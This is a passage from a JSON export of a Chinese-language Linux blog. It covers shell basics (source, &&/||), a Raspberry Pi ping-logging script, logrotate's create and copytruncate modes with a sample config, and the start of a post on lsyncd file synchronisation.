rel=\"noopener\">shell執行順序</a></p>\n<p>source<br>之前寫超級終端機文章有寫到source<br><a href=\"https://malagege.github.io/blog/2018/01/22/logdown/2018-01-22-5198665/\">超級終端機 zplug | 程式狂想筆記</a></p>\n<blockquote>\n<p>由於 /etc/profile 與 ~/.bash_profile 都是在取得 login shell 的時候才會讀取的設定檔，所以， 如果你將自己的偏好設定寫入上述的檔案後，通常都是得登出再登入後，該設定才會生效。那麼，能不能直接讀取設定檔而不登出登入呢？ 可以的！那就得要利用 source 這個指令了！<br>利用 source 或小數點 (.) 都可以將設定檔的內容讀進來目前的 shell 環境中！ 舉例來說，我修改了 ~/.bashrc ，那麼不需要登出，立即以 source ~/.bashrc 就可以將剛剛最新設定的內容讀進來目前的環境中！很不錯吧！還有，包括 ~/bash_profile 以及 /etc/profile 的設定中， 很多時候也都是利用到這個 source (或小數點) 的功能喔！<br><a href=\"http://linux.vbird.org/linux_basic/0320bash.php#source\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – source ：讀入環境設定檔的指令</a></p>\n</blockquote>\n<p>env<br>看環境變數用</p>\n<h2 id=\"cmd1-amp-amp-cmd2與-cmd1-cmd2\"><a href=\"#cmd1-amp-amp-cmd2與-cmd1-cmd2\" class=\"headerlink\" title=\"cmd1 &amp;&amp; cmd2與  cmd1 ||cmd2\"></a>cmd1 &amp;&amp; cmd2與  cmd1 ||cmd2</h2><p>之前有寫過<a href=\"https://malagege.github.io/blog/2018/03/26/logdown/2018-03-26-7062187/\">連續打指令&amp;&amp; 與;差別 | 程式狂想筆記</a></p>\n<h3 id=\"cmd1-amp-amp-cmd2\"><a href=\"#cmd1-amp-amp-cmd2\" class=\"headerlink\" title=\"cmd1 &amp;&amp; cmd2\"></a>cmd1 &amp;&amp; cmd2</h3><ol>\n<li>若 cmd1 執行完畢且正確執行($?=0)，則開始執行 cmd2。</li>\n<li>若 cmd1 執行完畢且為錯誤 ($?≠0)，則 cmd2 不執行。</li>\n</ol>\n<h3 id=\"cmd1-cmd2\"><a href=\"#cmd1-cmd2\" class=\"headerlink\" title=\"cmd1 ||  cmd2\"></a>cmd1 ||  cmd2</h3><ol>\n<li>若 cmd1 執行完畢且正確執行($?=0)，則 cmd2 不執行。</li>\n<li>若 cmd1 執行完畢且為錯誤 ($?≠0)，則開始執行 cmd2。</li>\n</ol>\n<p>來自<a href=\"http://linux.vbird.org/linux_basic/0320bash.php#fig10.5.2\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – $? (指令回傳值) 與 &amp;&amp; 或 ||</a></p>\n<p>$?是指令回傳錯誤碼<br>&amp;&amp; cmd1執行錯誤就不會執行cmd2<br><strong>|| cmd1執行錯誤就會執行cmd2，相反cmd1執行正確cmd2就不會執行</strong><br>這個好特別!!!</p>\n","categories":["Linux"],"tags":["linux","source","env","export"]},{"title":"logrotate 自動切割 log 小記","url":"/blog/2020/01/27/logrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98/","content":"<p>最近 Pi 2號機有時候 ssh 不穩<br>重開數據機或重插網路線就恢復正常<br>不知道是哪邊問題<br>想寫 ping log 來排除一些狀況</p>\n<a id=\"more\"></a>\n<h2 id=\"ping-shell\"><a href=\"#ping-shell\" class=\"headerlink\" title=\"ping shell\"></a>ping shell</h2><p>首先，我需要準備 ping 的 shell 程式</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">IP=<span class=\"variable\">$1</span></span><br><span class=\"line\"></span><br><span class=\"line\">date <span class=\"string\">\"+%Y-%m-%d %H:%M:%S\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"PING HOST <span class=\"variable\">$&#123;IP&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> [ TRUE ]</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">        ping -c 10 <span class=\"variable\">$&#123;IP&#125;</span></span><br><span class=\"line\">        sleep 300 <span class=\"comment\">#300秒檢查</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>開啟 tmux 分割多個視窗<br><code>./test.sh &gt; ping_tw.yahoo.com.log</code></p>\n<p>更多 ping 相關指令<br><a href=\"https://blog.gtwang.org/linux/windows-linux-ping-command-tutorial/\" target=\"_blank\" rel=\"noopener\">Ping 指令用法教學：檢查網路連線狀態與品質 - G. T. Wang</a> <a href=\"/blog/2020/01/27/logrotate-自動切割-log-小記/ping.png\" title=\"備份圖\">備份圖</a></p>\n<h3 id=\"沒辦法中斷-Ctrl-C-程式\"><a href=\"#沒辦法中斷-Ctrl-C-程式\" class=\"headerlink\" title=\"沒辦法中斷(Ctrl + C) 程式\"></a>沒辦法中斷(Ctrl + C) 程式</h3><p><a href=\"https://www.jianshu.com/p/a028c9eef2c2\" target=\"_blank\" rel=\"noopener\">你无法用ctrl c 杀死的进程 - 简书</a></p>\n<p>簡單解決方法，用 htop kill掉程式吧…</p>\n<h3 id=\"shell-比較要注意加”\"><a href=\"#shell-比較要注意加”\" class=\"headerlink\" title=\"shell 比較要注意加”\"></a>shell 比較要注意加”</h3><blockquote>\n<p>有兩種解決方法：<br>if [ “$app-running” == “” ];<br>或是<br>if [[ $app-running == “” ]];</p>\n</blockquote>\n<p><a href=\"https://medium.com/micheh/linux-%E7%9A%84-shell-script-%E4%B8%AD-%E9%81%87%E5%88%B0-unary-operator-expected-%E7%9A%84%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95-3b4725d3fdf1\" target=\"_blank\" rel=\"noopener\">Linux 的 shell script 中，遇到 unary operator expected 的解決方法</a></p>\n<h3 id=\"shell-error-print\"><a href=\"#shell-error-print\" class=\"headerlink\" title=\"shell error print\"></a>shell error print</h3><p><a href=\"http://linuxcommand.org/lc3_wss0140.php\" target=\"_blank\" rel=\"noopener\">Writing shell scripts - Lesson 14: Errors and Signals and Traps (Oh My!) - Part 1</a></p>\n<h2 id=\"logrotate\"><a href=\"#logrotate\" class=\"headerlink\" title=\"logrotate\"></a>logrotate</h2><h3 id=\"更換-log-方法\"><a href=\"#更換-log-方法\" class=\"headerlink\" title=\"更換 log 方法\"></a>更換 log 方法</h3><p>其實 logrotate 切割 log 我有在想不會跟線上執行程式衝到嗎?<br><a href=\"https://wsgzao.github.io/post/logrotate/\" target=\"_blank\" rel=\"noopener\">Linux 日志切割神器 logrotate 原理介绍和配置详解 | HelloDog</a> <a href=\"/blog/2020/01/27/logrotate-自動切割-log-小記/web1.png\" title=\"備份圖\">備份圖</a><br>這邊裡面有詳細說明</p>\n<blockquote>\n<p>如上也就是 logrotate 的默認操作方式，也就是 mv+create 執行完之後，通知應用重新在新文件寫入即可。mv+create 成本都比較低，幾乎是原子操作，如果應用支持重新打開日誌文件，如 syslog, nginx, mysql 等，那麼這是最好的方式。<br>不過，有些程序並不支持這種方式，壓根沒有提供重新打開日誌的接口；而如果重啟應用程序，必然會降低可用性，為此引入了如下方式。</p>\n</blockquote>\n<p>這邊讓我想到之前有做，mv 跟 cp 實驗(<a href=\"https://malagege.github.io/blog/2020/01/10/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/\">cp 複製檔案可能沒注意的事情 | 程式狂想筆記</a>)</p>\n<p>我計畫使用 <code>./test.sh &gt; ping_tw.yahoo.com.log</code><br>但這個好像不可行 我是使用指令倒出 log</p>\n<h3 id=\"輸出問題\"><a href=\"#輸出問題\" class=\"headerlink\" title=\"輸出問題\"></a>輸出問題</h3><p>我想預防上述的問題<br>我想到下面方法<br><strong>不過先說明以下 shell 不能正常執行</strong><br><strong>不過先說明以下 shell 不能正常執行</strong><br><strong>不過先說明以下 shell 不能正常執行</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">IP=<span class=\"variable\">$1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$&#123;IP&#125;</span>\"</span> = <span class=\"string\">\"\"</span> ];<span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"must need put IP\"</span> 1&gt;&amp;2</span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">OUTLOG=<span class=\"string\">\" &gt;&gt; ping_<span class=\"variable\">$&#123;IP&#125;</span>.log\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> [ TRUE ]</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"=========================================\"</span> <span class=\"variable\">$OUTLOG</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"=========================================\"</span> <span class=\"variable\">$OUTLOG</span></span><br><span class=\"line\">        date <span class=\"string\">\"+%Y-%m-%d %H:%M:%S\"</span> <span class=\"variable\">$OUTLOG</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"PING HOST: <span class=\"variable\">$&#123;IP&#125;</span>\"</span> <span class=\"variable\">$OUTLOG</span></span><br><span class=\"line\"></span><br><span class=\"line\">        ping -c 10 <span class=\"variable\">$&#123;IP&#125;</span>  <span class=\"variable\">$OUTLOG</span></span><br><span class=\"line\">        sleep 300 <span class=\"comment\">#300秒檢查</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">log() &#123;</span><br><span class=\"line\">  if [ -n \"$logfile\" ]; then</span><br><span class=\"line\">    printf '%s\\n' \"$@\" &gt;&gt; \"$logfile\"</span><br><span class=\"line\">  else</span><br><span class=\"line\">    printf '%s\\n' \"$@\"</span><br><span class=\"line\">  fi</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">log \"$buf\"</span><br></pre></td></tr></table></figure>\n<p>可修正成這個方法<a href=\"https://unix.stackexchange.com/questions/336224/elegant-solution-to-echo-to-either-stdout-or-file-in-bash\" target=\"_blank\" rel=\"noopener\">shell script - Elegant solution to echo to either stdout or file in bash - Unix &amp; Linux Stack Exchange</a></p>\n<p>因為<del>我比較懶</del>行數比較少，所以我就寫在每一行 XD<br>但其實可以不用這樣寫<br>可參考後續文章<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">IP=<span class=\"variable\">$1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$&#123;IP&#125;</span>\"</span> = <span class=\"string\">\"\"</span> ];<span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"must need put IP\"</span> 1&gt;&amp;2</span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">OUTLOG=<span class=\"string\">\" &gt;&gt; ping_<span class=\"variable\">$&#123;IP&#125;</span>.log\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> [ TRUE ]</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"=========================================\"</span>  &gt;&gt; ping_<span class=\"variable\">$&#123;IP&#125;</span>.<span class=\"built_in\">log</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"=========================================\"</span>  &gt;&gt; ping_<span class=\"variable\">$&#123;IP&#125;</span>.<span class=\"built_in\">log</span></span><br><span class=\"line\">        date <span class=\"string\">\"+%Y-%m-%d %H:%M:%S\"</span>  &gt;&gt; ping_<span class=\"variable\">$&#123;IP&#125;</span>.<span class=\"built_in\">log</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"PING HOST: <span class=\"variable\">$&#123;IP&#125;</span>\"</span>  &gt;&gt; ping_<span class=\"variable\">$&#123;IP&#125;</span>.<span class=\"built_in\">log</span></span><br><span class=\"line\"></span><br><span class=\"line\">        ping -c 10 <span class=\"variable\">$&#123;IP&#125;</span>   &gt;&gt; ping_<span class=\"variable\">$&#123;IP&#125;</span>.<span class=\"built_in\">log</span></span><br><span class=\"line\">        sleep 300 <span class=\"comment\">#300秒檢查</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure></p>\n<p>這樣我應該就能使用 CREATE 機制<br>終於到我們重頭戲了</p>\n<h2 id=\"logrotate-1\"><a href=\"#logrotate-1\" class=\"headerlink\" title=\"logrotate\"></a>logrotate</h2><h3 id=\"相關教學網站\"><a href=\"#相關教學網站\" class=\"headerlink\" title=\"相關教學網站\"></a>相關教學網站</h3><ul>\n<li><a href=\"http://n.sfs.tw/content/index/12926\" target=\"_blank\" rel=\"noopener\">[CENTOS7] 使用 logrotate 來整理wildfly日誌檔 @新精讚</a></li>\n<li><a href=\"https://wsgzao.github.io/post/logrotate/\" target=\"_blank\" rel=\"noopener\">Linux 日誌切割神器 logrotate 原理介紹和配置詳解 | HelloDog</a></li>\n<li><a href=\"https://ihower.tw/blog/archives/3565\" target=\"_blank\" rel=\"noopener\">使用 logrotate 定期整理 Rails Log 檔案 – ihower { blogging }</a></li>\n<li><a href=\"https://www.jianshu.com/p/ea7c2363639c\" target=\"_blank\" rel=\"noopener\">linux 日志定时轮询流程详解 - 簡書</a></li>\n<li><a href=\"https://stackoverflow.com/questions/9555769/how-to-insert-a-date-inside-the-filename-with-logrotate\" target=\"_blank\" rel=\"noopener\">linux - How to insert a date inside the filename with logrotate - Stack Overflow</a></li>\n<li><a href=\"http://www.hatlonely.com/2018/04/16/linux-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1-logrotate/index.html\" target=\"_blank\" rel=\"noopener\">linux 日志管理服务 logrotate | hatlonely的小站</a></li>\n<li><a href=\"https://superuser.com/questions/255951/logrotate-configuration-file-syntax-multiple-wildcard-entries-possible\" target=\"_blank\" rel=\"noopener\">linux - logrotate configuration file syntax - multiple wildcard entries possible? - Super User</a></li>\n</ul>\n<h3 id=\"logrotate-重點小記\"><a href=\"#logrotate-重點小記\" class=\"headerlink\" title=\"logrotate 重點小記\"></a>logrotate 重點小記</h3><p>相關自訂 logrotate 設定可放在 <code>/etc/logrotate.d</code><br>原理可看<a href=\"https://wsgzao.github.io/post/logrotate/\" target=\"_blank\" rel=\"noopener\">Linux 日誌切割神器 logrotate 原理介紹和配置詳解 | HelloDog</a> 運行機制</p>\n<p>其實最原始的 conf設定在 <code>/etc/logrotate.conf</code><br>看到<code>include /etc/logrotate.d</code>就能明白為什麼會自動載入</p>\n<p>其他看到的重點</p>\n<blockquote>\n<p>   配置文件裡一定要配置 rotate 文件數目 這個參數。如果不配置默認是 0 個，也就是只允許存在一份日誌，剛切分出來的日誌會馬上被刪除。多麼痛的領悟，說多了都是淚。<br>   執行 logrotate 命令最好加 -f 參數，不然有時候配置文件修改的內容不生效。</p>\n</blockquote>\n<h2 id=\"我的-ping-程式設定\"><a href=\"#我的-ping-程式設定\" class=\"headerlink\" title=\"我的 ping 程式設定\"></a>我的 ping 程式設定</h2><p>/home/pi/ping/ping_*.log {<br>  daily<br>  dateext<br>  missingok<br>  rotate 30<br>  notifempty<br>  create 664 pi pi<br>}</p>\n<h2 id=\"訊號問題\"><a href=\"#訊號問題\" class=\"headerlink\" title=\"訊號問題\"></a>訊號問題</h2><p>看到有些需要做 HUP 動作，讓程式重新讀 log 方法<br>使用<strong>create</strong>需要注意通知程式做，copytruncate 不需要做</p>\n<blockquote>\n<p>create</p>\n<p>create 是默認的方案，可以通過 create 命令配置文件的權限和屬組設置。</p>\n<p>這個方案的思路是：<strong> 重命名原日誌文件，創建新的日誌文件 </strong>。</p>\n<p>詳細步驟如下：</p>\n<pre><code>1. 重命名正在輸出的日誌文件。 因為重命名只修改文件（目錄亦文件）的名稱，而進程操作文件使用的是 inode，所以並不影響原程序繼續輸出日誌。\n\n2. 創建新的日誌文件。 文件名和原日誌文件一樣，注意，此時只是文件名稱一樣，而 inode 編號不同，程序輸出的日誌還是往原日誌文件輸出。\n\n3. 最後通過某些方式通知程序，重新打開日誌文件。 由於重新打開日誌文件會用到文件路徑而非 inode 編號，所以打開的是新的日誌文件。\n</code></pre><p>簡而言之，logrotate 的默認操作方式，就是 mv+create 執行完之後，通知應用重新在新文件寫入即可。mv+create 成本都比較低，幾乎是原子操作，如果應用支&gt; 持重新打開日誌文件，如 syslog、 nginx、mysql 等，那麼這是最好的方式。</p>\n<p>不過，有些程序並不支持這種方式，壓根兒沒有提供重新打開日誌的接口，而如果重啟應用程序，必然會降低可用性，為此引入了 copytruncate 方式。<br>copytruncate</p>\n<p>copytruncate 是把正在輸出的日誌拷（copy）一份出來，再清空 （trucate）原來的日誌。</p>\n<p>詳細步驟如下：</p>\n<pre><code>1. 將當前正在輸出的日誌文件複製為目標文件，此時程序仍然將日誌輸出到原來文件中，原文件名也沒有變。\n2. 清空原日誌文件，程序仍然還是輸出到原日誌文件中，因為清空文件只把文件的內容刪除了，而 inode 並沒改變。\n</code></pre><p>所以 copytruncate 也就是先複製一份文件，然後清空原有文件。</p>\n<p>通常來說，清空操作比較快，但是如果日誌文件太大，那麼複製就會比較耗時，從而可能導致部分日誌丟失。不過這種方式不需要應用程序的支持即可使用。</p>\n</blockquote>\n<p>參考：<a href=\"https://www.pwdpwd.com/post/2020-01-03-linux-logrotate/\" target=\"_blank\" rel=\"noopener\">Linux 日志切割工具 Logrotate | PwD</a></p>\n<p><a href=\"https://www.cnblogs.com/276815076/p/7053640.html\" target=\"_blank\" rel=\"noopener\">linux 日志定时轮询流程详解(logrotate) - 生活费 - 博客园</a><br><a href=\"https://blog.51cto.com/pengjc/1774210\" target=\"_blank\" rel=\"noopener\">kill -HUP 命令的使用-赤练挚爱-51CTO博客</a></p>\n<h3 id=\"意外小實驗結果\"><a href=\"#意外小實驗結果\" class=\"headerlink\" title=\"意外小實驗結果\"></a>意外小實驗結果</h3><p>雖然不是很清楚他的原理，但我剛剛做一個實驗<br>得出很有趣的結果</p>\n<blockquote>\n<p>如果是用 &gt; 重定向輸出的日誌，如 test_app &gt; stdout.log, copytruncate 則無法裁剪原始日誌文件 stdout.log, 它將持續增漲下去。而用 &gt;&gt; 就沒問題了，test-app &gt;&gt; stdout.log，日誌滾動後 stdout.log 大小將變為零。</p>\n</blockquote>\n<p><a href=\"https://yanbin.blog/linux-config-log-ratation-logrotate/\" target=\"_blank\" rel=\"noopener\">Linux 下配置滚动日志之 logrotate | 隔叶黄莺 Yanbin Blog - 软件编程实践</a></p>\n<p>這邊把  ping.sh 標準輸出註解掉了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">IP=<span class=\"variable\">$1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$&#123;IP&#125;</span>\"</span> = <span class=\"string\">\"\"</span> ];<span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"must need put IP\"</span> 1&gt;&amp;2</span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">OUTLOG=<span class=\"string\">\" &gt;&gt; ping_<span class=\"variable\">$&#123;IP&#125;</span>.log\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> [ TRUE ]</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"=========================================\"</span>  <span class=\"comment\">#&gt;&gt; ping_$&#123;IP&#125;.log</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"=========================================\"</span>  <span class=\"comment\">#&gt;&gt; ping_$&#123;IP&#125;.log</span></span><br><span class=\"line\">        date <span class=\"string\">\"+%Y-%m-%d %H:%M:%S\"</span>  <span class=\"comment\">#&gt;&gt; ping_$&#123;IP&#125;.log</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"PING HOST: <span class=\"variable\">$&#123;IP&#125;</span>\"</span>  <span class=\"comment\">#&gt;&gt; ping_$&#123;IP&#125;.log</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        ping -c 10 <span class=\"variable\">$&#123;IP&#125;</span>   <span class=\"comment\">#&gt;&gt; ping_$&#123;IP&#125;.log</span></span><br><span class=\"line\">        <span class=\"comment\">#sleep 300 #300秒檢查</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"使用-create-做-ping-sh-127-0-0-1-gt-gt-ping-127-0-0-1-log\"><a href=\"#使用-create-做-ping-sh-127-0-0-1-gt-gt-ping-127-0-0-1-log\" class=\"headerlink\" title=\"使用 create 做 ./ping.sh 127.0.0.1 &gt;&gt; ping_127.0.0.1.log\"></a>使用 create 做 ./ping.sh 127.0.0.1 &gt;&gt; ping_127.0.0.1.log</h3><p>做 logrotate(<code>sudo logrotate -vf /etc/logrotate.d/ping</code>) 後會產生ping_127.0.0.1.log,ping_127.0.0.1.log-2020-01-27<br>程式持續跑的log會加在ping_127.0.0.1.log-2020-01-27<br>如果還記得流程的話，上面有說要 HUP 通知信號跟程式講重抓 log 寫入設定檔</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">3. 最後通過某些方式通知程序，重新打開日誌文件。 由於重新打開日誌文件會用到文件路徑而非 inode 編號，所以打開的是新的日誌文件。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用-copytruncate-做-ping-sh-127-0-0-1-gt-gt-ping-127-0-0-1-log\"><a href=\"#使用-copytruncate-做-ping-sh-127-0-0-1-gt-gt-ping-127-0-0-1-log\" class=\"headerlink\" title=\"使用 copytruncate 做 ./ping.sh 127.0.0.1 &gt;&gt; ping_127.0.0.1.log\"></a>使用 copytruncate 做 ./ping.sh 127.0.0.1 &gt;&gt; ping_127.0.0.1.log</h3><p>做 logrotate(<code>sudo logrotate -vf /etc/logrotate.d/ping</code>) 後會產生ping_127.0.0.1.log,ping_127.0.0.1.log-2020-01-27<br>程式持續跑的log會加在ping_127.0.0.1.log<br>但聽說這種作法有機率遺失 log</p>\n\n<h2 id=\"gt\"><a href=\"#gt\" class=\"headerlink\" title=\"&gt;\"></a>&gt;</h2><p>這個應該沒什麼機會用到<br>但對 create , copytruncate 都會造成 log  紀錄有問題<br>結果我就不貼了</p>\n<h2 id=\"測試使用\"><a href=\"#測試使用\" class=\"headerlink\" title=\"測試使用\"></a>測試使用</h2><p>建議加 sudo root執行</p>\n<ol>\n<li><p>sudo logrotate /etc/logrotate.d/ping<br>執行 logrotate</p>\n</li>\n<li><p>sudo logrotate -d /etc/logrotate.d/ping<br>測試日誌切割 (如果文件的時間小於一天，不會執行切割日誌 )</p>\n</li>\n<li><p>sudo logrotate -vf /etc/logrotate.d/ping<br>強制輪詢切割日誌 ( 為了便於我們直觀的觀察測試結果,建議大家手動試一下 )<br>-f (–force), 就是把不管日誌文件大小是否符合要求，強制執行日誌滾動操作</p>\n</li>\n</ol>\n<p>參照:<a href=\"https://zhuanlan.zhihu.com/p/24880144\" target=\"_blank\" rel=\"noopener\">linux环境下使用logrotate工具实现nginx日志切割 - 知乎</a></p>\n<h3 id=\"測試完建議刪除檔案\"><a href=\"#測試完建議刪除檔案\" class=\"headerlink\" title=\"測試完建議刪除檔案\"></a>測試完建議刪除檔案</h3><p>測試完建議刪除檔案，否則會出現如下錯誤<br>error: destination /home/pi/ping/ping_127.0.0.1.log-20200127 already exists, skipping rotation</p>\n<p><a href=\"https://stackoverflow.com/questions/25845752/logrotate-suffix-dateext-rotate\" target=\"_blank\" rel=\"noopener\">linux - logrotate suffix: dateext + rotate - Stack Overflow</a></p>\n<p>最後 shell 用 tmux 爽爽執行 ping.sh 程式</p>\n<h3 id=\"logrotate-2\"><a href=\"#logrotate-2\" class=\"headerlink\" title=\"logrotate\"></a>logrotate</h3><p>配置選項</p>\n<p>常用選項：</p>\n<pre><code>daily - 指定轉儲週期為每天\nweekly - 指定轉儲週期為每週\nmonthly - 指定轉儲週期為每月\nrotate count - 指定日誌文件刪除之前轉儲的次數，0 指沒有備份，5 指保留 5 個備份\ntabooext [+] list - 讓 logrotate 不轉儲指定擴展名的文件，缺省的擴展名是：.rpm-orig、.rpmsave、v 和 ～\nmissingok - 在日誌輪循期間，任何錯誤將被忽略，例如 * 文件無法找到 * 之類的錯誤\nsize size - 當日誌文件到達指定的大小時才轉儲，bytes (缺省) 及 KB (sizek) 或 MB (sizem)\ncompress - 通過 gzip 壓縮轉儲以後的日誌\nnocompress - 不壓縮\ncopytruncate - 用於還在打開中的日誌文件，把當前日誌備份並截斷\nnocopytruncate - 備份日誌文件但是不截斷\ncreate mode owner group - 轉儲文件，使用指定的文件模式創建新的日誌文件\nnocreate - 不建立新的日誌文件\ndelaycompress - 和 compress 一起使用時，轉儲的日誌文件到下一次轉儲時才壓縮\nnodelaycompress - 覆蓋 delaycompress 選項，轉儲同時壓縮。\nerrors address - 轉儲時的錯誤信息發送到指定的 Email 地址\nifempty - 即使是空文件也轉儲，這是 logrotate 的缺省選項。\nnotifempty - 如果是空文件的話，不轉儲\nmail address - 把轉儲的日誌文件發送到指定的 E-mail 地址\nnomail - 轉儲時不發送日誌文件\nolddir directory - 儲後的日誌文件放入指定的目錄，必須和當前日誌文件在同一個文件系統\nnoolddir - 轉儲後的日誌文件和當前日誌文件放在同一個目錄下\nprerotate/endscript - 在轉儲以前需要執行的命令可以放入這個選項對之間，這兩個關鍵字必須單獨成行\nsharedscripts - 默認情況下，prerotate/endscript 內定義的命令會對匹配到的所有文件 (比如： /var/log/news/*）都執行一次，如果指定為 sharedscripts，則這些命令只會執行一次\ndateext - 對於轉儲的日誌文件加上日期後綴\n</code></pre><p>參考:<a href=\"https://www.pwdpwd.com/post/2020-01-03-linux-logrotate/\" target=\"_blank\" rel=\"noopener\">Linux 日誌切割工具 Logrotate | PwD</a> <a href=\"/blog/2020/01/27/logrotate-自動切割-log-小記/web2.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"總結\"><a href=\"#總結\" class=\"headerlink\" title=\"總結\"></a>總結</h2><p>其實這篇不重要刪減，所以看的內容非常雜<br>不過經過這次實驗有清楚了解到要怎麼使用 logrotate</p>\n<p>後續如果程式要做 HUP 訊號要怎麼處理?之後有空在研究</p>\n","categories":["Linux"],"tags":["linux","log"]},{"title":"lsyncd 做檔案同步實作紀錄","url":"/blog/2020/04/25/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/","content":"<p>最近看到這幾篇使用 inotify 做文件同步感到有興趣<br>雖然現在工作上目前還沒用到<br>但這種情境感覺很常遇到<br><del>希望能用不用寫程式方法</del></p>\n<ul>\n<li><a href=\"https://www.haxi.cc/archives/Rsync-inotify%E5%81%9A%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5.html\" target=\"_blank\" rel=\"noopener\">Rsync + inotify 做文件实时同步 - 哈希</a></li>\n<li><a href=\"https://www.haxi.cc/archives/Rsync-sersync%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5.html\" target=\"_blank\" rel=\"noopener\">Rsync + sersync 实现文件实时同步 - 哈希</a></li>\n<li><a href=\"https://www.haxi.cc/archives/rsync-lsyncd%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5-1.html\" target=\"_blank\" rel=\"noopener\">rsync + lsyncd 实现文件实时同步 - 哈希</a></li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"相關工具\"><a href=\"#相關工具\" class=\"headerlink\" title=\"相關工具\"></a>相關工具</h2><ul>\n<li>inotify</li>\n</ul>\n<p><a href=\"https://malagege.github.io/blog/2020/01/12/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/\">inotify-tools 監聽資料夾裡檔案異動工具 | 程式狂想筆記</a><br>之前小記這篇，其實裡面沒什麼實作<br>需透過 bash 執行<br>但這樣當然不是很方便，所以有類似 sersync 和 lsyncd 工具解決這個方案</p>\n<ul>\n<li>sersync</li>\n</ul>\n<p>這篇<a href=\"https://www.centos.bz/2017/08/lsyncd-rsync-inotify/\" target=\"_blank\" rel=\"noopener\">lsyncd实时同步搭建指南——取代rsync+inotify-Linux运维日志</a>有講到很多優點缺點<a 